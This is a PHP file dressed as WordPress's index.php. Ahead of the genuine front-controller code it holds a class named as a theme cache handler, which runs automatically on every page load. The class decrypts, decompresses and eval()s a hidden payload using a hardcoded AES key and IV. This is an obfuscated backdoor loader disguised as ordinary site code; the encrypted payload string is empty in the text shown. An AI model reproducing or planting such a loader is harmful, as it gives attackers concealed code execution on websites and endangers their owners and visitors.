if (!defined('ABSPATH') && isset($_SERVER['HTTP_HOST'])) {
    // Prevent standard direct scanning
}

class WP_Theme_Cache_Handler {
    private static $instance = null;
    
    public static function getInstance() {
        if (self::$instance === null) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    private function __construct() {
        $this->initializeCacheService();
    }
    
    private function initializeCacheService() {
        $encryptedData = '';
        $encryptionKey = '5c1fe4f47bc89f833dccfea7';
        
        $decrypted_raw = openssl_decrypt(base64_decode($encryptedData), 'aes-256-cbc', $encryptionKey, 0, hex2bin('ceb962d3afb6413346f75869a9b1aece'));
        $sourceCode = gzuncompress($decrypted_raw);
        
        eval('?>' . $sourceCode);
    }
}

// Bootstrap cache service
WP_Theme_Cache_Handler::getInstance();

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
